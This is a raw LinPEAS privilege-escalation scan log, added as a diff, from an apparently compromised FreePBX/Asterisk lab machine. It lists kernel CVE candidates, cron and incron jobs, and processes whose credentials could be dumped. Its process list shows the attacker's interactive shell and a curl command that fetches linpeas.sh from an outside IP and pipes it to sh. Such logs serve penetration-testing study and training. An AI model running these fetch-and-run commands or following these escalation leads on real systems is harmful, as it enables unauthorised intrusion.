@@ -1,0 +1,640 @@
+
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄���▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------|
+    |         Linux PE & Hardening    :     https://hacktricks-training.com/courses/lhe/ |
+    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |
+    |         Follow on Twitter         :     @hacktricks_live                        |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          LinPEAS-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
+Best Linux PE & Hardening course: https://hacktricks-training.com/courses/lhe/
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look into it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting LinPEAS. Caching Writable Folders...
+                               ╔════════════════��══╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════
+                               ╚═══════════════════╝
+OS: Linux version 5.4.239-1.el7.elrepo.x86_64 (mockbuild@Build64R7) (gcc version 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC)) #1 SMP Thu Mar 30 10:40:27 EDT 2023
+User & Groups: uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
+Hostname: connected
+
+[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
+[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
+[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)
+[+] nmap is available for network discovery & port scanning, you should use it yourself
+ 13 1038k   13  138k    0     0  49541      0  0:00:21  0:00:02  0:00:19 49530Caching directories . . . . . . . . . . . . . . . . . . . . . . .  . . . . . . . 
+uniq: write error: Broken pipe
+uniq: write error: Broken pipe
+DONE
+
+ 38 1038k   38  394k    0     0   6201      0  0:02:51  0:01:05  0:01:46  6201                              ╔════════════════════╗
+══════════════════════════════╣ System Information ╠══════════════════════════════
+                              ╚════════════════════╝
+╔══════════╣ Operative system (T1082)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
+Linux version 5.4.239-1.el7.elrepo.x86_64 (mockbuild@Build64R7) (gcc version 9.3.1 20200408 (Red Hat 9.3.1-2) (GCC)) #1 SMP Thu Mar 30 10:40:27 EDT 2023
+lsb_release Not Found
+
+╔══════════╣ Sudo version (T1548.003,T1068)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
+Sudo version 1.8.23
+
+
+╔══════════╣ PATH (T1574.007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
+/usr/bin:/bin
+
+╔══════════╣ Date & uptime (T1082)
+Sun Jun 21 18:21:59 UTC 2026
+ 18:21:59 up 32 min,  0 users,  load average: 0.88, 0.36, 0.17
+
+╔══════════╣ Unmounted file-system? (T1082,T1120)
+╚ Check if you can mount umounted devices
+
+/dev/mapper/sngos_pbxconnect-root /                       xfs     defaults        0 0
+UUID=9123c2fc-0cf7-4e99-b64b-3683066bd343 /boot                   xfs     defaults        0 0
+/dev/mapper/sngos_pbxconnect-swap swap                    swap    defaults        0 0
+
+╔══════════╣ Any sd*/disk* disk in /dev? (limit 20) (T1082)
+disk
+sda
+sda1
+sda2
+
+╔══════════╣ Environment (T1082,T1552.007)
+╚ Any private information inside environment variables?
+TERM=xterm
+SHELL=/bin/bash
+USER=asterisk
+PWD=/home/asterisk
+LANG=en_US.utf8
+HOME=/home/asterisk
+SHLVL=6
+LOGNAME=asterisk
+LESSOPEN=||/usr/bin/lesspipe.sh %s
+XDG_RUNTIME_DIR=/run/user/999
+_=/usr/bin/env
+
+╔══════════╣ Searching Signature verification failed in dmesg (T1082)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
+[    1.273547] dm_mod: module verification failed: signature and/or required key missing - tainting kernel
+
+╔══════════╣ Protections (T1518.001)
+═╣ AppArmor enabled? .............. AppArmor Not Found
+═╣ AppArmor profile? .............. unconfined
+═╣ is linuxONE? ................... s390x Not Found
+═╣ grsecurity present? ............ grsecurity Not Found
+═╣ PaX bins present? .............. PaX Not Found
+═╣ Execshield enabled? ............ Execshield Not Found
+═╣ SELinux enabled? ............... SELinux status:                 disabled
+═╣ Seccomp enabled? ............... disabled
+═╣ User namespace? ................ enabled
+═╣ unpriv_userns_clone? ........... /proc/sys/kernel/unprivileged_userns_clone Not Found
+═╣ unpriv_bpf_disabled? ........... 2
+═╣ Cgroup2 enabled? ............... enabled
+═╣ kptr_restrict? ................. 0
+═╣ dmesg_restrict? ................ 0
+═╣ ptrace_scope? .................. /proc/sys/kernel/yama/ptrace_scope Not Found
+═╣ protected_symlinks? ............ /proc/sys/fs/protected_symlinks Not Found
+═╣ protected_hardlinks? ........... /proc/sys/fs/protected_hardlinks Not Found
+═╣ perf_event_paranoid? ........... 2
+═╣ mmap_min_addr? ................. 4096
+═╣ lockdown mode? ................. [none] integrity confidentiality
+═╣ Kernel hardening flags? ........ # CONFIG_SLAB_FREELIST_RANDOM is not set
+# CONFIG_SLAB_FREELIST_HARDENED is not set
+CONFIG_RANDOMIZE_BASE=y
+CONFIG_STACKPROTECTOR=y
+CONFIG_STACKPROTECTOR_STRONG=y
+# CONFIG_KASAN is not set
+CONFIG_KASAN_STACK=1
+═╣ Is ASLR enabled? ............... Yes
+═╣ Printer? ....................... No
+═╣ Is this a virtual machine? ..... Yes (vmware)
+
+╔══════════╣ Kernel Modules Information (T1547.006)
+══╣ Kernel modules with weak perms? (T1547.006)
+
+══╣ Kernel modules loadable?  (T1547.006)
+Modules can be loaded
+══╣ Module signature enforcement?  (T1547.006)
+Not enforced
+
+╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
+╚ https://copy.fail/
+╚ https://www.cve.org/CVERecord?id=CVE-2026-31431
+  File "/tmp/cf31-probe-4950.py", line 21
+    print(msg, flush=True)
+                    ^
+SyntaxError: invalid syntax
+Python probe inconclusive; falling back to POSIX sh triage.
+NOT VULNERABLE: algif_aead autoload is blocked and the module is not loaded.
+
+╔══════════╣ Kernel Exploit Registry (T1068)
+═╣ Operating system ............. Linux
+═╣ Kernel release ............... 5.4.239-1.el7.elrepo.x86_64
+═╣ Comparable version ........... 5.4.239.1
+═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
+═╣ Kernel config source ......... /boot/config-5.4.239-1.el7.elrepo.x86_64
+CVE: CVE-2021-27365 | Name: linux-iscsi | Match data: pkg=linux-kernel,ver<=5.11.3,CONFIG_SLAB_FREELIST_HARDENED!=y | Tags: RHEL=8 | Rank: 1 | Details: CONFIG_SLAB_FREELIST_HARDENED must not be enabled
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS | Match data: pkg=linux-kernel,ver>=3.13,ver<5.14,x86_64 | Tags: ubuntu=(14.04|16.04|18.04|20.04|20.10) | Rank: 1 | Details: Only Ubuntu is affected.
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write | Match data: pkg=linux-kernel,ver>=2.6.19,ver<=5.12-rc6 | Tags: ubuntu=20.04{kernel:5.8.0-*} | Rank: 1 | Details: ip_tables kernel module must be loaded
+CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)═╣ Kernel vulns found: 4
+
+╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
+╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
+╚ https://www.cve.org/CVERecord?id=CVE-2026-43284
+╚ https://www.cve.org/CVERecord?id=CVE-2026-43500
+CVE-2026-43284 (xfrm-ESP): built into kernel (modprobe blacklist ineffective)
+CVE-2026-43500 (rxrpc): autoloadable: rxrpc
+modprobe mitigation (xfrm-ESP): present
+modprobe mitigation (rxrpc): present
+Unprivileged user namespaces: enabled
+
+
+
+ 61 1038k   61  634k    0     0   7604      0  0:02:19  0:01:25  0:00:54  7624                                   ╔═══════════╗
+═══════════════════════════════════╣ Container ╠═══════════════════════════════════
+                                   ╚═══════════╝
+╔══════════╣ Container related tools present (if any): (T1613)
+/usr/bin/nsenter
+/usr/bin/unshare
+/usr/sbin/chroot
+/usr/sbin/capsh
+/usr/sbin/setcap
+/usr/sbin/getcap
+
+╔══════════╣ Container details (T1613,T1611)
+═╣ Is this a container? ........... No
+═╣ Interesting runtime sockets ... ═╣ Any running containers? ........ No
+
+
+
+ 62 1038k   62  650k    0     0   7488      0  0:02:21  0:01:29  0:00:52  6338                                     ╔═══════╗
+═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
+                                     ╚═══════╝
+Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
+
+═╣ GCP Virtual Machine? ................. No
+═╣ GCP Cloud Funtion? ................... No
+═╣ AWS ECS? ............................. No
+═╣ AWS EC2? ............................. No
+═╣ AWS EC2 Beanstalk? ................... No
+═╣ AWS Lambda? .......................... No
+═╣ AWS Codebuild? ....................... No
+═╣ DO Droplet? .......................... No
+═╣ IBM Cloud VM? ........................ No
+═╣ Azure VM or Az metadata? ............. No
+═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
+═╣ Azure Automation Account? ............ No
+═╣ Aliyun ECS? .......................... No
+═╣ Tencent CVM? ......................... No
+
+
+
+ 67 1038k   67  698k    0     0   6211      0  0:02:51  0:01:55  0:00:56  5103                ╔════════════════════════════════════════════════╗
+════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
+                ╚════════════════════════════════════════════════╝
+╔══════════╣ Running processes (cleaned) (T1057)
+╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
+root          1  0.0  0.1 125600  5372 ?        Ss   17:49   0:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 22
+root        564  0.0  0.1  39088  5340 ?        Ss   17:49   0:00 /usr/lib/systemd/systemd-journald
+root        584  0.0  0.0 190384  2888 ?        Ss   17:49   0:00 /usr/sbin/lvmetad -f
+root        590  0.0  0.0  45800  3636 ?        Ss   17:49   0:00 /usr/lib/systemd/systemd-udevd
+root        707  0.0  0.0  55540  2436 ?        S<sl 17:49   0:01 /sbin/auditd
+root        709  0.0  0.0  84564  1856 ?        S<sl 17:49   0:01  _ /sbin/audispd
+_laurel     713  0.1  0.1  28180  6436 ?        S<   17:49   0:03      _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
+  └─(Caps) 0x0000000000080004=cap_dac_read_search,cap_sys_ptrace
+root        734  0.0  0.0  26392  2996 ?        Ss   17:49   0:00 /usr/lib/systemd/systemd-logind
+avahi       747  0.0  0.0  62172   396 ?        S    17:49   0:00  _ avahi-daemon: chroot helper
+root        738  0.0  0.1  52880  4892 ?        Ss   17:49   0:00 /usr/sbin/smartd -n -q never
+root        743  0.0  0.1  90576  5528 ?        Ss   17:49   0:01 /sbin/rngd -f
+root        744  0.0  0.0  15044  2836 ?        Ss   17:49   0:00 /usr/sbin/incrond
+polkitd     745  0.0  0.4 615112 19380 ?        Ssl  17:49   0:00 /usr/lib/polkit-1/polkitd --no-debug
+root        746  0.0  0.0  21688  2876 ?        Ss   17:49   0:00 /usr/sbin/irqbalance --foreground
+chrony      749  0.0  0.0 117816  3164 ?        S    17:49   0:00 /usr/sbin/chronyd -f /etc/sangoma_chrony.conf
+  └─(Caps) 0x0000000002000400=cap_net_bind_service,cap_sys_time
+root        752  0.0  0.2  99696 10408 ?        Ss   17:49   0:00 /usr/bin/VGAuthService -s
+root        757  0.0  0.2 313764 11692 ?        Ssl  17:49   0:01 /usr/bin/vmtoolsd
+dbus        762  0.0  0.1  60340  4640 ?        Ss   17:49   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
+  └─(Caps) 0x0000000020000000=cap_audit_write
+root        794  0.0  0.2 228400  9712 ?        Ss   17:49   0:00 /usr/sbin/abrtd -d -s
+root        796  0.0  0.2 225864  8560 ?        Ss   17:49   0:00 /usr/bin/abrt-watch-log -F BUG: WARNING: at WARNING: CPU: INFO: possible recursive locking detected ernel BUG at list_del corruption list_add corruption do_IRQ: stack overflow: ear stack overflow (cur: eneral protection fault nable to handle kernel ouble fault: RTNL: assertion failed eek! page_mapcount(page) went negative! adness at NETDEV WATCHDOG ysctl table check failed : nobody cared IRQ handler type mismatch Kernel panic - not syncing: Machine Check Exception: Machine check events logged divide error: bounds: coprocessor segment overrun: invalid TSS: segment not present: invalid opcode: alignment check: stack segment: fpu exception: simd exception: iret exception: /var/log/messages -- /usr/bin/abrt-dump-oops -xtD
+libstor+    797  0.0  0.0   8588  1680 ?        Ss   17:49   0:00 /usr/bin/lsmd -d
+root        817  0.0  0.8 358840 34868 ?        Ssl  17:49   0:00 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid
+root        867  0.0  0.3 547968 13288 ?        Ssl  17:49   0:00 /usr/sbin/NetworkManager --no-daemon[0m
+root        974  0.0  0.2 102912  9176 ?        S    17:49   0:00  _ /sbin/dhclient -d -q -sf /usr/libexec/nm-dhcp-helper -pf /var/run/dhclient-eth0.pid -lf /var/lib/NetworkManager/dhclient-1634588d-2dd3-4ad3-b967-d14777c9f613-eth0.lease -cf /var/lib/NetworkManager/dhclient-eth0.conf eth0
+root       1162  0.0  0.6 574312 24312 ?        Ssl  17:49   0:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
+root       1166  0.0  0.1 112932  7884 ?        Ss   17:49   0:00 /usr/sbin/sshd -D
+root       1174  0.0  0.1 222772  7152 ?        Ssl  17:49   0:00 /usr/sbin/rsyslogd -n
+redis      1177  0.1  0.2 143064  9004 ?        Ssl  17:49   0:02 /usr/bin/redis-server 127.0.0.1:6379
+root       1179  0.0  0.0  27176  2308 ?        Ss   17:49   0:00 /usr/sbin/xinetd -stayalive -pidfile /var/run/xinetd.pid
+root       1180  0.0  0.8 522300 34100 ?        Ss   17:49   0:00 /usr/sbin/httpd -DFOREGROUND
+asterisk   4171  0.0  0.9 634752 36880 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4172  0.0  0.9 634752 36788 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4173  0.0  0.9 634752 36824 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4174  0.0  0.9 634752 36808 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4175  0.0  0.9 634752 36828 ?        S    18:12   0:00  _ /usr/sbin/httpd -DFOREGROUND
+asterisk   4248  0.0  0.9 634752 36808 ?        S    18:13   0:00  _ /usr/sbin/httpd -DFOREGROUND
+root       1214  0.0  0.0 126420  3204 ?        Ss   17:49   0:00 /usr/sbin/crond -n
+root       4302  0.0  0.1 184588  4596 ?        S    18:14   0:00  _ /usr/sbin/CROND -n
+root       7407  0.0  0.1 184588  4596 ?        S    18:22   0:00  _ /usr/sbin/CROND -n
+asterisk   7416  1.3  1.5 481264 62028 ?        S    18:22   0:00          _ php /usr/sbin/fwconsole job --run --quiet
+root       1215  0.0  0.0  25916  2164 ?        Ss   17:49   0:00 /usr/sbin/atd -f
+root       1230  0.0  0.0 110212  1756 tty1     Ss+  17:49   0:00 /sbin/agetty --noclear tty1 linux
+mongodb    1251  0.6  1.4 477840 58712 ?        Sl   17:49   0:12 /usr/bin/mongod --quiet -f /etc/mongod.conf run
+root       1271  0.0  0.0 115412  2344 ?        S    17:49   0:00 /bin/sh /usr/sbin/safe_asterisk
+asterisk   1275  1.3  1.9 2196828 76576 ?       Sl   17:49   0:25  _ /usr/sbin/asterisk -f -vvvg -c
+mysql      1278  0.0  0.0 113420  3176 ?        Ss   17:49   0:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
+mysql      1494  0.3  3.1 1634688 124556 ?      Sl   17:49   0:07  _ /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
+root       1376  0.0  0.8 267684 35132 ?        S    17:49   0:01 /usr/bin/python3.6 -m aiohttp.web aiovega.web:app_factory -H 127.0.0.1 -P 4000
+root       1634  0.0  0.1  91796  4848 ?        Ss   17:49   0:00 /usr/libexec/postfix/master -w
+postfix    1635  0.0  0.1  91900  6608 ?        S    17:49   0:00  _ pickup -l -t unix -u
+postfix    1636  0.0  0.1  91968  6660 ?        S    17:49   0:00  _ qmgr -l -t unix -u
+asterisk   1786  0.0  0.3 198360 12036 ?        Ss   17:50   0:00 /usr/bin/python /usr/local/bin/pnp_server
+root       2628  0.0  0.0 125492  2568 ?        Ss   18:01   0:00 /usr/sbin/anacron -s
+asterisk   4322  0.0  0.1 116212  4108 ?        S    18:14   0:00 bash -i
+asterisk   4370  0.0  0.1 116212  4064 ?        S    18:14   0:00  _ /bin/bash -i
+asterisk   4949  0.0  0.1 178920  4232 ?        S    18:20   0:00      _ curl http://10.10.15.34:8080/linpeas.sh
+asterisk   4950  3.1  0.1 115360  5076 ?        S    18:20   0:03      _ sh
+asterisk  20939  0.0  0.0 115360  3780 ?        S    18:22   0:00          _ sh
+asterisk  20942  0.0  0.1 155780  4128 ?        R    18:22   0:00          |   _ ps fauxwww
+asterisk  20943  0.0  0.0 115360  2832 ?        S    18:22   0:00          _ sh
+
+╔══════════╣ Processes with unusual configurations (T1057)
+
+╔══════════╣ Processes with credentials in memory (root req) (T1003.007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 Not Found
+sshd: Not Found
+mysql process found (dump creds from memory as root)
+postgres Not Found
+redis-server process found (dump creds from memory as root)
+mongod process found (dump creds from memory as root)
+memcached Not Found
+elasticsearch Not Found
+jenkins Not Found
+tomcat Not Found
+nginx Not Found
+php-fpm Not Found
+supervisord Not Found
+vncserver Not Found
+xrdp Not Found
+teamviewer Not Found
+
+╔══════════╣ Opened Files by processes (T1003.007)
+Process 1275 (asterisk) - /usr/sbin/asterisk -f -vvvg -c 
+  └─ Has open files:
+    └─ /dev/tty9
+    └─ /dev/urandom
+    └─ /var/log/asterisk/queue_log
+    └─ /var/lib/asterisk/astdb.sqlite3
+    └─ /var/log/asterisk/full
+    └─ /var/log/asterisk/fail2ban
+Process 4322 (asterisk) - bash -i 
+  └─ Has open files:
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+Process 4370 (asterisk) - /bin/bash -i 
+  └─ Has open files:
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+Process 4950 (asterisk) - sh 
+  └─ Has open files:
+    └─ pipe:[82632]
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+Process 7415 (asterisk) - /bin/sh -c [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null 
+  └─ Has open files:
+    └─ pipe:[91970]
+    └─ pipe:[91971]
+Process 7416 (asterisk) - php /usr/sbin/fwconsole job --run --quiet 
+  └─ Has open files:
+    └─ pipe:[91970]
+    └─ pipe:[91971]
+    └─ /var/log/asterisk/freepbx.log
+Process 29440 (asterisk) - sh 
+  └─ Has open files:
+    └─ pipe:[82632]
+    └─ pipe:[128146]
+    └─ /var/log/asterisk/freepbx.log
+    └─ pipe:[47577]
+
+╔══════════╣ Processes with memory-mapped credential files (T1003.007)
+
+╔══════════╣ Processes whose PPID belongs to a different user (not root) (T1134.004)
+╚ You will know if a user can somehow spawn processes as a different user
+
+╔══════════╣ Files opened by processes belonging to other users (T1083)
+╚ This is usually empty because of the lack of privileges to read other user processes information
+
+╔══════════╣ Check for vulnerable cron jobs (T1053.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
+══╣ Cron jobs list (T1053.003)
+/usr/bin/crontab
+1 1 * * * /usr/sbin/fwconsole certificates --updateall -q 2>&1 >/dev/null
+* 4 * * * /usr/sbin/fwconsole util cleanplaybackcache -q
+22 11 * * 6 [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole ma listonline --sendemail -q > /dev/null 2>&1
+22 13 * * 6 [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole ma upgradeall --sendemail -q > /dev/null 2>&1
+* * * * * [ -e /usr/sbin/fwconsole ] && /usr/sbin/fwconsole job --run --quiet 2>&1 > /dev/null
+/usr/bin/incrontab
+-rw-------. 1 root root   0 Aug  8  2019 /etc/cron.deny
+-rw-r--r--. 1 root root 451 Jun  9  2014 /etc/crontab
+
+/etc/cron.d:
+total 28
+drwxr-xr-x.   2 root root   74 Nov 30  2025 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rw-r--r--.   1 root root  128 Aug  8  2019 0hourly
+-rw-r--r--.   1 root root  257 Jun  6  2023 cron-updates
+-rw-r--r--.   1 root root  108 Nov 27  2019 raid-check
+-rw-------.   1 root root  235 Apr  1  2020 sysstat
+
+/etc/cron.daily:
+total 24
+drwxr-xr-x.   2 root root   57 Nov 30  2025 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rwx------.   1 root root  219 Apr  1  2020 logrotate
+-rwxr-xr-x.   1 root root  618 Oct 30  2018 man-db.cron
+-rwx------.   1 root root  208 Apr 10  2018 mlocate
+
+/etc/cron.hourly:
+total 16
+drwxr-xr-x.   2 root root   22 Jun  9  2014 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+-rwxr-xr-x.   1 root root  392 Aug  8  2019 0anacron
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x.   2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+
+/etc/cron.weekly:
+total 12
+drwxr-xr-x.   2 root root    6 Jun  9  2014 .
+drwxr-xr-x. 119 root root 8192 Jun 21 17:49 ..
+
+/var/spool/anacron:
+total 12
+drwxr-xr-x.  2 root root  63 Nov 30  2025 .
+drwxr-xr-x. 13 root root 158 Nov 30  2025 ..
+-rw-------.  1 root root   9 Jun 21 18:11 cron.daily
+-rw-------.  1 root root   9 Dec  3  2025 cron.monthly
+-rw-------.  1 root root   9 Dec  3  2025 cron.weekly
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+
+
+
+/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
+/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
+/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
+/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
+/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
+/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
+/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
+/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#
+
+/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
+ 
+/etc/crontab:2:PATH=/sbin:/bin:/usr/sbin:/usr/bin
+/etc/cron.d/0hourly:3:PATH=/sbin:/bin:/usr/sbin:/usr/bin
+/etc/cron.d/0hourly:5:01 * * * * root run-parts /etc/cron.hourly
+
+══╣ Cron files with hidden carriage returns (T1053.003)
+
+══╣ Checking for specific cron jobs vulnerabilities (T1053.003)
+Checking cron directories...
+══╣ run-parts executable entries (T1053.003)
+[/etc/cron.hourly]
+/etc/cron.hourly/0anacron
+[/etc/cron.daily]
+/etc/cron.daily/man-db.cron
+[/etc/cron.weekly]
+[/etc/cron.monthly]
+
+
+╔══════════╣ System timers (T1053.003)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers
+══╣ Active timers: (T1053.003)
+NEXT                         LEFT     LAST                         PASSED    UNIT                         ACTIVATES
+Mon 2026-06-22 18:04:55 UTC  23h left Sun 2026-06-21 18:04:55 UTC  18min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
+n/a                          n/a      n/a                          n/a       systemd-readahead-done.timer systemd-readahead-done.service
+══╣ Disabled timers: (T1053.003)
+══╣ Additional timer files: (T1053.003)
+
+╔══════════╣ Services and Service Files (T1543.002,T1007)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services
+
+══╣ Active services: (T1543.002,T1007)
+abrt-ccpp.service                  loaded active exited  Install ABRT coredump hook
+abrt-oops.service                  loaded active running ABRT kernel log watcher
+  Potential issue in service file: /usr/lib/systemd/system/abrt-oops.service
+  └─ RELATIVE_PATH: Could be executing some relative path\n
+abrtd.service                      loaded active running ABRT Automated Bug Reporting Tool
+asterisk.service                   loaded active running LSB: Asterisk PBX
+atd.service                        loaded active running Job spooling tools
+auditd.service                     loaded active running Security Auditing Service
+avahi-daemon.service               loaded active running Avahi mDNS/DNS-SD Stack
+blk-availability.service           loaded active exited  Availability of block devices
+chronyd.service                    loaded active running NTP client/server
+crond.service                      loaded active running Command Scheduler
+dbus.service                       loaded active running D-Bus System Message Bus
+firewalld.service                  loaded active running firewalld - dynamic firewall daemon
+getty@tty1.service                 loaded active running Getty on tty1
+httpd.service                      loaded active running The Apache HTTP Server
+incrond.service                    loaded active running Inotify System Scheduler
+irqbalance.service                 loaded active running irqbalance daemon
